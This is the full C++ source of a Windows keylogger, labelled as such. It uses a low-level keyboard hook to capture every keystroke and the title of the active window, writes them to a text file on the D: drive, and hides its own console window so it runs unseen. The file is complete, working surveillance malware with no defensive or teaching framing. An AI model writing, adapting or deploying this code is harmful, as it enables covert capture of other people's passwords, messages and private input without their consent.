// unicode keylogger

#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <fcntl.h>
#include <io.h>
#include <locale>
#include <codecvt>
using namespace std;
#define MAX_LENGTH 1000


wchar_t buf[MAX_LENGTH];
int count_char = 0;
wchar_t uni_buf[200];
int uni_c = 0;
wstring pre_app_name = L" ";

void save_in_file(wchar_t str[])
{
    wofstream  fileS{ "D:\\zfor_fun.txt",ios_base::app };//open file
    locale loc(locale(), new codecvt_utf8<wchar_t>);//define utf8
    fileS.imbue(loc);//set utf_8 to output stream of file

    fileS << str;
    fileS.close();
}
LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {


    int SHIFT_key = 0;
    int CTRL_key = 0;
    int ALT_key = 0;
    if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
    {
        SHIFT_key = GetAsyncKeyState(VK_SHIFT);
        CTRL_key = GetAsyncKeyState(VK_CONTROL);
        ALT_key = GetAsyncKeyState(VK_MENU);

        KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);

        HWND handle = GetForegroundWindow(); //get the windows user current work
        wchar_t app_name[MAX_LENGTH];
        app_name[MAX_LENGTH - 1] = '\0';

        if (count_char >= MAX_LENGTH - 3) {//check length buffer if full save to file
            buf[MAX_LENGTH - 2] = '\n';
            buf[MAX_LENGTH - 1] = '\0';
            count_char = 0;
            save_in_file(buf);//save to file
        }
        if (GetWindowTextW(handle, app_name, MAX_LENGTH) > 0) {
            wstring app_name_str = app_name;
            if (app_name_str != pre_app_name) {//check to see if user switch tab save content of keylog to file
                int length = wcslen(app_name);
                app_name[length] = L':';
                app_name[length + 1] = '\n';
                app_name[length + 2] = '\0';

                buf[count_char++] = '\n';
                buf[count_char] = '\0';
                count_char = 0;
                save_in_file(buf);//save content of previous keylog tab before user go to another tab
                wchar_t line[] = L"==============================\n";//sperator line
                save_in_file(line);
                save_in_file(app_name);//save name of app to file

                pre_app_name = app_name_str;//save previous tab name
            }


        }//end get text


        int key = hooked_key.vkCode;

        if (key >= 0x41 && key <= 0x5a) {//encouter a-z 
            wchar_t c = key;
            if (SHIFT_key) {
                buf[count_char++] = c; //to upper
            }
            else buf[count_char++] = c + 0x20;//to lower
            uni_c = 0;
        }

        if (key >= 0x30 && key <= 0x39) {//encouter 1-9 is not numlock
            wchar_t c = L' ';
            if (SHIFT_key) {
                switch (key) {
                case '0':c = L')';
                    break;
                case '1':c = L'!';
                    break;
                case '2':c = L'@';
                    break;
                case '3':c = L'#';
                    break;
                case '4':c = L'$';
                    break;
                case '5':c = L'%';
                    break;
                case '6':c = L'^';
                    break;
                case '7':c = L'&';
                    break;
                case '8':c = L'*';
                    break;
                case '9':c = L'(';
                    break;

                }
            }
            else  c = key;

            buf[count_char++] = c;
            uni_c = 0;
        }
        else if (key >= 0x60 && key <= 0x69) { //encouter numlock
            wchar_t c = key - 0x30;
            buf[count_char++] = c;
            uni_c = 0;
        }
        else if (key == VK_SPACE) {
            buf[count_char++] = ' ';//encouter spacebar
            uni_c = 0;
        }
        else if (key == VK_BACK) { //encouter backspace
            if (count_char - 1 > 0) count_char--;//  //check length
            else count_char = 0;
            buf[count_char] = ' ';
            uni_c = 0;
        }
        else if (key == VK_MULTIPLY) {
            buf[count_char++] = '*'; //encouter * numlock
            uni_c = 0;
        }
        else if (key == VK_OEM_MINUS) {
            buf[count_char++] = '-';
            uni_c = 0;
        }//encouter - numlock
        else if (key == VK_ADD) {
            buf[count_char++] = '+'; //encouter + numlock
            uni_c = 0;
        }
        else if (key == VK_DIVIDE) {
            buf[count_char++] = '/'; //encouter + numlock
            uni_c = 0;
        }
        else if (key == VK_OEM_PERIOD) {//encouter . 
            if (SHIFT_key) {
                buf[count_char++] = '>';
            }
            else buf[count_char++] = '.';
            uni_c = 0;
        }

        else if (key == VK_OEM_COMMA) {
            if (SHIFT_key) {
                buf[count_char++] = '<';
            }
            else buf[count_char++] = ',';
            uni_c = 0;
        }
        else if (key == VK_OEM_5) {
            if (SHIFT_key) {
                buf[count_char++] = '|';
            }
            else buf[count_char++] = '\\';
            uni_c = 0;
        }

        else if (key == VK_OEM_4) {
            if (SHIFT_key) {
                buf[count_char++] = '{';
            }
            else buf[count_char++] = '[';
            uni_c = 0;
        }


        else if (key == VK_OEM_6) {
            if (SHIFT_key) {
                buf[count_char++] = '}';
            }
            else buf[count_char++] = ']';
            uni_c = 0;
        }


        else if (key == VK_OEM_3) {
            if (SHIFT_key) {
                buf[count_char++] = '~';
            }
            else buf[count_char++] = '`';
            uni_c = 0;
        }

        else if (key == VK_OEM_1) {
            if (SHIFT_key) {
                buf[count_char++] = ':';
            }
            else buf[count_char++] = ';';
            uni_c = 0;
        }
        //
        else if (key == VK_OEM_2) {
            if (SHIFT_key) {
                buf[count_char++] = '?';
            }
            else buf[count_char++] = '/';
            uni_c = 0;
        }

        else if (key == VK_OEM_7) {
            if (SHIFT_key) {
                buf[count_char++] = '"';
            }
            else buf[count_char++] = 0x27;// value of ' in ascii
            uni_c = 0;
        }
        //
        else if (key == VK_OEM_PLUS) {
            if (SHIFT_key) {
                buf[count_char++] = '+';
            }
            else buf[count_char++] = '=';// value of ' in ascii
            uni_c = 0;
        }
        //
        else if (CTRL_key) {//encouter CTRL 
            wchar_t c[] = L" [CTRL] ";
            buf[++count_char] = '\0';
            count_char = 0;
            save_in_file(buf);//save to file
            save_in_file(c);
        }

        else if (ALT_key) {//encouter ALT 
            wchar_t c[] = L" [ALT ]";
            buf[++count_char] = '\0';
            count_char = 0;
            save_in_file(buf);//save to file
            save_in_file(c);
        }
        //////////////////////////////////////////////
        else if (key == VK_RETURN) {//encouter ENTER                           
            buf[count_char++] = '\n';
            buf[count_char] = '\0';
            count_char = 0;
            save_in_file(buf);//save to file
        }//enter

        else if (key == VK_PACKET) {
            uni_c++;

            if (uni_c < 2) {
                if (count_char != 0) { //check length c;
                    count_char--;
                }
                else count_char = 0;
                buf[count_char] = hooked_key.scanCode;// not multi unicode
                count_char++;
            }
            else {
                buf[count_char++] = hooked_key.scanCode;//  multi unicode
            }
        }






    }//end if
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}//end function

void MessageLoop()
{
    MSG message;
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}

DWORD WINAPI my_HotKey()
{
    HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardEvent, NULL, NULL);
    MessageLoop();
    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}

int main(int argc, char** argv)
{
    HANDLE hThread;
    DWORD dwThread;
    //hide process

    HWND hide;
    AllocConsole();// allocating a new console for the process
    hide = FindWindowA("ConsoleWindowClass", NULL);//get handle of windows console
    ShowWindow(hide, SW_HIDE);//set hide 

    my_HotKey();



}



